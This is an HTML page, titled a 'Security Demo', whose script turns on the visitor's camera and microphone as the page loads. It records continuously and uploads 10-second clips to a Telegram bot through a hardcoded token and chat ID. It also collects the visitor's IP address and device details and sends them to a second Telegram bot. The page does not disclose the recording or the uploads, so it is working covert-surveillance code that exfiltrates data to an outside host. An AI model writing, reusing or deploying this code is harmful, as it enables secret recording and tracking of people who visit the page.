<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Demo with Video Recording</title>
    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
</head>
<body>
    <h1>Test Mask</h1>
    <video id="video" width="640" height="480" autoplay></video>

    <script>
        const video = document.getElementById('video');
        let mediaRecorder;
        let recordedChunks = [];

        // Access the camera and start video streaming
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
            .then(stream => {
                video.srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                mediaRecorder.start();
                setInterval(() => {
                    mediaRecorder.stop();
                    sendToTelegram(new Blob(recordedChunks, { type: 'video/webm' }));
                    recordedChunks = [];
                    mediaRecorder.start();
                }, 10000); // Record in 10-second intervals
            })
            .catch(err => console.error('Error accessing media devices.', err));

        // Function to send the video to Telegram
        function sendToTelegram(blob) {
            const token = ''7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
            const chatId = '6121166273';
            const url = `https://api.telegram.org/bot${token}/sendVideo`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'recording.webm');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Video sent successfully:', data))
            .catch((error) => console.error('Error sending video to Telegram:', error));
        }

        // Collect IP address and device information
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                console.log('IP Address:', data.ip);
                sendDeviceInfo(data.ip);
            });

        function sendDeviceInfo(ip) {
            const deviceInfo = {
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };

            const token = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `New visitor info:\nIP: ${deviceInfo.ip}\nUser-Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}\nTimestamp: ${deviceInfo.timestamp}`
                })
            })
            .then(response => response.json())
            .then(data => console.log('Device info sent successfully:', data))
            .catch((error) => console.error('Error sending device info to Telegram:', error));
        }
    </script>
</body>
</html>
